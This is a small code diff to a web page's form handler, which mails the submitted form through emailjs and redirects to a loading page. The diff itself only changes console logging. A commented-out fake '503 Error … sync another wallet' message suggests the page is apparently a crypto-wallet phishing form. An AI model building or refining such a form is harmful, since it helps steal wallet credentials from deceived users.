@@ -8633,14 +8633,14 @@ body{
 
       emailjs.sendForm(serviceID, templateID, this)
         .then(() => {
+          console.log("Your mail is sent!");
           window.location.href = "loading.html";
           //alert("503 Error, if this persist kindly sync another wallet and try again or contact admin");
         }, (err) => {
           alert("Please try again!");
         });
 
-
-      console.log("Your mail is sent!");
+      console.log("Done");
 
 
 
